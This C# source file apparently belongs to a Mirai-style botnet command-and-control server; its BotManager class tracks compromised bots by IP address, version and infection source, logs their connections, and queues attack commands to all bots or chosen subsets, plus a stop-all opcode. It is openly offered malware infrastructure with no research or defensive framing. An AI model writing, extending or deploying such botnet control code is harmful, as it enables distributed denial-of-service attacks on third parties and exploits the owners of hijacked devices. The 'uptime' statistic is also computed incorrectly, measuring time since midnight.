using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Serilog;

namespace MiraiCnCServer
{
  public class BotManager
  {
    private readonly ConcurrentDictionary<string, Bot> activeBots;
    private readonly DatabaseManager database;
    private readonly AttackCoordinator attackCoordinator;
    private readonly object statsLock = new object();

    public int TotalBotsEver { get; private set; }
    public int ActiveBotCount => activeBots.Count;

    public BotManager(DatabaseManager db, AttackCoordinator coordinator)
    {
      activeBots = new ConcurrentDictionary<string, Bot>();
      database = db;
      attackCoordinator = coordinator;
      TotalBotsEver = 0;
    }

    public async Task AddBotAsync(Bot bot)
    {
      if (activeBots.TryAdd(bot.Id, bot))
      {
        TotalBotsEver++;
        Log.Information($"[BotManager] Added bot {bot.IpAddress} | Total active: {ActiveBotCount} | Total ever: {TotalBotsEver}");

        // Log to database
        await database.LogBotConnectionAsync(bot.IpAddress, bot.Version, bot.Source);
      }
    }

    public async Task RemoveBotAsync(Bot bot)
    {
      if (activeBots.TryRemove(bot.Id, out _))
      {
        Log.Information($"[BotManager] Removed bot {bot.IpAddress} | Total active: {ActiveBotCount}");

        // Log to database
        await database.LogBotDisconnectionAsync(bot.IpAddress);
      }
    }

    public List<Bot> GetAllBots()
    {
      return activeBots.Values.ToList();
    }

    public List<Bot> GetBotsBySource(string source)
    {
      return activeBots.Values.Where(b => b.Source == source).ToList();
    }

    public Bot? GetBotById(string id)
    {
      activeBots.TryGetValue(id, out var bot);
      return bot;
    }

    public async Task SendAttackToAll(byte[] attackCommand)
    {
      Log.Information($"[BotManager] Sending attack to {ActiveBotCount} bots");

      int sent = 0;
      foreach (var bot in activeBots.Values)
      {
        try
        {
          bot.QueueAttackCommand(attackCommand);
          sent++;
        }
        catch (Exception ex)
        {
          Log.Error(ex, $"Failed to queue attack for bot {bot.IpAddress}");
        }
      }

      Log.Information($"[BotManager] Attack queued for {sent}/{ActiveBotCount} bots");
      await database.LogAttackAsync("ALL", attackCommand.Length, sent);
    }

    public async Task SendAttackToSubset(List<string> botIds, byte[] attackCommand)
    {
      Log.Information($"[BotManager] Sending attack to {botIds.Count} specific bots");

      int sent = 0;
      foreach (var botId in botIds)
      {
        if (activeBots.TryGetValue(botId, out var bot))
        {
          try
          {
            bot.QueueAttackCommand(attackCommand);
            sent++;
          }
          catch (Exception ex)
          {
            Log.Error(ex, $"Failed to queue attack for bot {bot.IpAddress}");
          }
        }
      }

      Log.Information($"[BotManager] Attack queued for {sent}/{botIds.Count} bots");
      await database.LogAttackAsync("SUBSET", attackCommand.Length, sent);
    }

    public async Task KillAllAttacksAsync()
    {
      Log.Information($"[BotManager] Stopping all attacks on {ActiveBotCount} bots");

      // Create stop attack command (0xFF opcode)
      var stopCommand = new byte[] { 0x00, 0x00, 0x00, 0x00, 0xFF };

      foreach (var bot in activeBots.Values)
      {
        try
        {
          bot.QueueAttackCommand(stopCommand);
        }
        catch (Exception ex)
        {
          Log.Error(ex, $"Failed to send stop command to bot {bot.IpAddress}");
        }
      }

      await Task.CompletedTask;
    }

    public Dictionary<string, object> GetStatistics()
    {
      var stats = new Dictionary<string, object>
      {
        ["active_bots"] = ActiveBotCount,
        ["total_bots_ever"] = TotalBotsEver,
        ["bots_by_version"] = activeBots.Values.GroupBy(b => b.Version).ToDictionary(g => g.Key.ToString(), g => g.Count()),
        ["bots_by_source"] = activeBots.Values.GroupBy(b => b.Source).ToDictionary(g => string.IsNullOrEmpty(g.Key) ? "unknown" : g.Key, g => g.Count()),
        ["uptime_seconds"] = (DateTime.UtcNow - DateTime.Today).TotalSeconds
      };

      return stats;
    }
  }
}
